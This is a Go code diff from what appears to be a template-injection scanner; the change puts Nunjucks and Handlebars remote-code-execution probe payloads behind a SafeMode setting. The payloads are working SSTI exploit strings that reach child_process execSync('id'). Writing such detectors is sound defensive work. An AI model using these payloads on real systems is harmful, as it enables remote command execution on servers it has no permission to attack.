@@ -488,7 +488,7 @@ func (d *Detector) thymeleafPayloads(a, b, result int) []*Payload {
 func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
 	resultStr := fmt.Sprintf("%d", result)
 
-	return []*Payload{
+	payloads := []*Payload{
 		{
 			Template:       fmt.Sprintf("{{%d*%d}}", a, b),
 			Engine:         EngineNunjucks,
@@ -511,18 +511,27 @@ func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
 			MathB:          b,
 			MathResult:     result,
 		},
-		{
+	}
+
+	if !d.config.SafeMode {
+		payloads = append(payloads, &Payload{
 			Template:    "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
 			Engine:      EngineNunjucks,
 			Type:        PayloadRCE,
 			Regex:       regexp.MustCompile(`uid=|gid=`),
 			Description: "Nunjucks RCE via constructor",
 			Severity:    finding.Critical,
-		},
+		})
 	}
+
+	return payloads
 }
 
 func (d *Detector) handlebarsPayloads(a, b, result int) []*Payload {
+	if d.config.SafeMode {
+		return nil
+	}
+
 	return []*Payload{
 		{
 			Template:    "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
